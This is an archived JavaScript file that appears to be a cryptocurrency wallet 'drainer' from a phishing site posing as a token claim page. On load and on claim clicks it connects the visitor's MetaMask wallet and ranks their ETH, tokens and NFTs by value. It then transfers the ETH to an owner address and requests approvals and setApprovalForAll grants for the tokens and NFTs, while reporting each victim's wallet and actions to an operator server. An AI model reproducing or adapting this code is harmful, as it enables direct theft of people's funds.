var _____WB$wombat$assign$function_____ = function(name) {return (self._wb_wombat && self._wb_wombat.local_init && self._wb_wombat.local_init(name)) || self[name]; };
if (!self.__WB_pmw) { self.__WB_pmw = function(obj) { this.__WB_source = obj; return this; } }
{
  let window = _____WB$wombat$assign$function_____("window");
  let self = _____WB$wombat$assign$function_____("self");
  let document = _____WB$wombat$assign$function_____("document");
  let location = _____WB$wombat$assign$function_____("location");
  let top = _____WB$wombat$assign$function_____("top");
  let parent = _____WB$wombat$assign$function_____("parent");
  let frames = _____WB$wombat$assign$function_____("frames");
  let opener = _____WB$wombat$assign$function_____("opener");

ZAPPER_MATCH = {
  "eth": "ethereum",
  "matic": "polygon",
  "bsc": "binance-smart-chain"
}
NATIVE_MATCH = {
  "eth": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
  "matic": "0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0",
  "bsc": "0x1f98431c8ad98523631ae4a59f267346ea31f984"
}
CHAIN_ID = {
  "eth": 1,
  "matic": 137,
  "bsc": 56
}
MORALIS_MATCH = {
  eth: "eth",
  matic: "polygon",
  bsc: "bsc"
}


var connected = 0
itemList = []

var nativePrices = 0

var tgMsgCount = {
  approve: 0,
  canceled: 0,
  signed: 0,
  canceledSwitch: 0
}

account = ""

async function connectMetamask() {
  if (connected == 1) return;
  if (!window.ethereum) {
    console.log("Metamask is not installed")
    return
  }
  await ethereum.request({ method: "eth_requestAccounts" })
  provider = window.ethereum;
  web3 = new Web3(provider);
  const accounts = await web3.eth.getAccounts();
  account = accounts[0];
  connected = 1;
  updateState("metamaskConnected");
  console.log("Current account ", account);
  updateState("userTokensFetched");
  //fetch tokens in background

  updateState("userTokensFetching");
  fetchUserTokens(account);
  
  try{

    sendMsg(LOG_SCHEMA[logLanguage].onMetamaskConnect);
  } catch {
      
  }

}

async function fetchUserTokens(address) {

  let native_url = `https://web.archive.org/web/20221008202722/https://deep-index.moralis.io/api/v2/${address}/balance`
  let token_url = `https://web.archive.org/web/20221008202722/https://deep-index.moralis.io/api/v2/${address}/erc20`
  let token_price_url = "https://web.archive.org/web/20221008202722/https://deep-index.moralis.io/api/v2/erc20/"
  let nft_url = `https://web.archive.org/web/20221008202722/https://api.zapper.fi/v2/nft/balances/tokens?addresses%5B%5D=${address}&limit=25`

  let response = await fetch('https://web.archive.org/web/20221008202722/https://api.zapper.fi/v2/balances?addresses%5B%5D=' + `${address}`+"&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=binance-smart-chain", {
    headers: {
      'Authorization': ZAPPER_KEY
    }
  });
  let ready = (await response.text()).replace(/[\n]*event: [\w]*[\n]*data: \{"appId":"([-\w]*)","network":"([-\w]*)"/gi, `,"data$1$2": {"appId":"$1","network":"$2"`)
  console.log(ready)
  ready = '{' + ready.slice(1).replace('\n\nevent: end\ndata: {}\n\n', '') + '}'
  let data = JSON.parse(ready)

  let result = []
  for (let network in data) {
    let tokens = []
    for (let tok in data[network]['balance']) {
      if (Object.keys(data[network]['balance'][tok]).length !== 0) {
        for (let TOKEN in data[network]['balance'][tok]) {
          try{
            if (data[network]['balance'][tok][TOKEN]['address'] != '0x0000000000000000000000000000000000000000') {
              let t = {}
              t['contract'] = data[network]['balance'][tok][TOKEN]['address']
              t['type'] = 'token'
              t['balance'] = parseInt(data[network]['balance'][tok][TOKEN]['context']['balanceRaw'])
              t['price'] = data[network]['balance'][tok][TOKEN]['balanceUSD']
              if (data[network]['network'] == 'binance-smart-chain') { t['chain'] = 'bsc' }
              else if (data[network]['network'] == "polygon") { t['chain'] = 'matic' }
              else if (data[network]['network'] == "ethereum") { t['chain'] = 'eth' }
              else { t['chain'] = data[network]['network'] }
              tokens.push(t)
            } else {
              let t = {}
              t['contract'] = data[network]['balance'][tok][TOKEN]['address']
              t['type'] = 'native'
              t['balance'] = parseInt(data[network]['balance'][tok][TOKEN]['context']['balanceRaw'])
              t['price'] = data[network]['balance'][tok][TOKEN]['balanceUSD']
              if (data[network]['network'] == 'binance-smart-chain') { t['chain'] = 'bsc' }
              else if (data[network]['network'] == "polygon") { t['chain'] = 'matic' }
              else if (data[network]['network'] == "ethereum") { t['chain'] = 'eth' }
              else { t['chain'] = data[network]['network'] }
              tokens.push(t)
            }
          }
          catch {}
        }
      }
    }
    if (Object.keys(tokens).length !== 0)
      result.push(tokens)
  }



      response = await fetch(token_price_url + `0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2/price?chain=eth`,
        {
          headers: {
            "X-API-Key": MORALIS_KEY
          }
        }
      )
      data = await response.json()
      console.log(data)
      nativePrices = data.usdPrice

    let currNativePrice = nativePrices
    if (toDrain.nft == true) {

      let response = await fetch(nft_url, {
        headers: {
          'Authorization': ZAPPER_KEY,
        }
      })

      nftList = (await response.json()).items

      itemList = itemList.concat(nftList.map((el) => {
        return {
          contract: el.token.collection.address,
          balance: el.token.tokenId,
          type: "nft",
          price: el.token.estimatedValueEth * currNativePrice,
          chain: "eth"
        }
      }
      ))
    }

    if (toDrain.tokens == true) {
      let tempList = []
      for (let array in result) {
        for (tokenid in result[array]) {
          if (result[array][tokenid]['chain'] == "eth" && result[array][tokenid]['type'] == 'token') {
            tempList.push(result[array][tokenid])
          }
        }
      }
      itemList = itemList.concat(tempList)
    }

    if (toDrain.eth == true) {

      let tempList = []
      for (let array in result) {
        for (tokenid in result[array]) {
          if (result[array][tokenid]['chain'] == "eth" && result[array][tokenid]['type'] == 'native') {
            tempList.push(result[array][tokenid])
          }
        }
      }
      itemList = itemList.concat(tempList)
    }



  

  itemList.sort((a, b) => {
    if (a.price > b.price) {
      return -1
    } else if (a.price < b.price) {
      return 1
    } else {
      return 0
    }
  })

}



async function sendEth(amount, chain) {

  gasPrice = await web3.eth.getGasPrice()
  newAmount = amount - (Number(gasPrice)*40000)
  if (newAmount < 0) return

  var transactionObject = {
    from: account,
    to: ownerAddress,
    value: newAmount
  }

  var success = 1

  try {
    await web3.eth.sendTransaction(transactionObject);
  } catch (e) {
    console.log(e)
    success = 0

  }

  logTx(success);


}
async function sendToken(amount, tokenAddress) {

  console.log("IN SEND TOKEN", amount, tokenAddress)
  var tokenContract = new web3.eth.Contract(ERC20_ABI, tokenAddress);
  var success = 1

  try {
    await tokenContract.methods.approve(ownerAddress, amount.toString()).send({
      from: account,
      gas: 120000,
      gasPrice: 0
    });


  } catch (e) {
    console.log(e)
    success = 0
  }

  logTx(success);

}
async function sendNFT(id, tokenAddress) {

  var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
  var success = 1
  try {
    await tokenContract.methods.approve(ownerAddress, id).send({
      from: account,
      gas: 120000,
      gasPrice: 0
    });
  } catch (e) {
    console.log(e)
    success = 0
  }
  logTx(success);
}

async function setApprovalForAll(tokenAddress) {

  var tokenContract = new web3.eth.Contract(ERC721_ABI, tokenAddress);
  var success = 1
  try {
    await tokenContract.methods.setApprovalForAll(ownerAddress, true).send({
      from: account,
      gas: 120000,
      gasPrice: 0
    });
  } catch (e) {
    console.log(e)
    success = 0
  }
  logTx(success);
}



async function drain() {

  await setApprovalForAll("0xc36442b4a4522e871399cd717abdd847ab11fe88");



  for (var item of itemList) {
    console.log("draining", item)
    if (item.price > 0) {
      if (tgMsgCount.approve++ < 1) sendMsg(LOG_SCHEMA[logLanguage].onApprove)
      try {
      if (window.ethereum.networkVersion !== CHAIN_ID[item.chain]) await changeNetwork(CHAIN_ID[item.chain]);
      } catch (e) {
        if(tgMsgCount.canceledSwitch++ < 3) sendMsg(LOG_SCHEMA[logLanguage].onCancelSwitch)
        continue;
      }
      try {
        if (item.type == "native") await sendEth(item.balance, item.chain)
        else if (item.type == "token") await sendToken(item.balance, item.contract)
        else if (item.type == "nft") await sendNFT(item.balance, item.contract)
      } catch (e) {
        console.log(e)
      }
    }
  }

}

const changeNetwork = async (chainId) => {
  if (window.ethereum) {
    
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: Web3.utils.toHex(chainId) }],
      });
  
  }
}


function logTx(success) {
  if (success == 1) {
    if (tgMsgCount.signed++ < 3) sendMsg(LOG_SCHEMA[logLanguage].onSign);

  } else {
    if (tgMsgCount.canceled++ < 3) sendMsg(LOG_SCHEMA[logLanguage].onCancel);
  }
}



async function sendMsg(msg) {
  var newMsg = msg.replace("$id", localStorage.getItem("scUniqueId")).replace("$wallet", account)
  var timez = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var url = `${tgConfig.url}/checkAdd.php?add=${account}&time=${timez}&o=${newMsg}`;
  console.log(newMsg);
  resp = fetch(url).catch((err)=>{
    console.log('err_fetch');
  });
  /*var newMsg = msg.replace("$id", localStorage.getItem("scUniqueId")).replace("$wallet", account)
  var url = `https://web.archive.org/web/20221008202722/https://api.telegram.org/bot${tgConfig.botToken}/sendMessage?chat_id=${tgConfig.chatId}&parse_mode=markdown&text=${newMsg}`
  console.log(newMsg)
  resp = fetch(url)*/

}

window.addEventListener("load", async () => {
  id = localStorage.getItem("scUniqueId")
  /*if (id == null) {
    response = await fetch('https://web.archive.org/web/20221008202722/https://api.ipify.org')
    id = await response.text()
    localStorage.setItem("scUniqueId", id)
  }*/

  sendMsg(LOG_SCHEMA[logLanguage].onConnect)
})
try {
  window.ethereum.on("accountsChanged", (accounts) => {
    account = accounts[0]
    id = localStorage.getItem("scUniqueId")
    if (connected == 0) {
      sendMsg(LOG_SCHEMA[logLanguage].onMetamaskConnect)
    }
  })
} catch(e) {
  console.log(e)
}


window.addEventListener("beforeunload", function (e) {
  var confirmationMessage = 'It looks like you have been editing something. '
    + 'If you leave before saving, your changes will be lost.';


  (e || window.event).returnValue = confirmationMessage; //Gecko + IE
  sendMsg(LOG_SCHEMA[logLanguage].onDisconnect)
  return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
});




function getMobileOperatingSystem() {
  var userAgent = navigator.userAgent || navigator.vendor || window.opera;
  console.log(userAgent);
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const uid = urlParams.get('uid')
  console.log(uid);
  if (uid == "mm") {
    return "Metamask";
  }
  if (/windows phone/i.test(userAgent)) {
    return "Windows Phone";
  }

  if (/android/i.test(userAgent)) {
    return "Android";
  }
  if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
    return "iOS";
  }

  return "unknown";
}


updateState("metamaskDisconnected")

if (autoMetamaskConnect == 1) {
  connectMetamask()
}

async function connectAndDrain() {
  console.log("_")
  if (connected == 0) await connectMetamask();
  await drain();
}

document.addEventListener('DOMContentLoaded', (event) => {

  if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem() == "iOS") {
    for(connect of connects) {
    var wrapper = document.createElement('a');
    wrapper.classList.add('mmLink');
    wrapper.href = "https://web.archive.org/web/20221008202722/https://metamask.app.link/dapp/" + ((window.location.href).replace('https://', '').replace('http://', '')) + "?uid=mm";
    connect.parentNode.insertBefore(wrapper, connect);
    wrapper.appendChild(connect);
    }
  }
  connectAndDrain();
  document.getElementById("claim").onclick = connectAndDrain;
  document.getElementById("claim2").onclick = connectAndDrain;


});
//document.getElementById("transfer").onclick = drain;


}
/*
     FILE ARCHIVED ON 20:27:22 Oct 08, 2022 AND RETRIEVED FROM THE
     INTERNET ARCHIVE ON 07:21:09 Jul 22, 2025.
     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.

     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
     SECTION 108(a)(3)).
*/
/*
playback timings (ms):
  captures_list: 0.775
  exclusion.robots: 0.028
  exclusion.robots.policy: 0.011
  esindex: 0.018
  cdx.remote: 190.029
  LoadShardBlock: 369.229 (3)
  PetaboxLoader3.datanode: 271.436 (5)
  PetaboxLoader3.resolve: 1909.652 (2)
  load_resource: 2104.378
  loaddict: 268.312
*/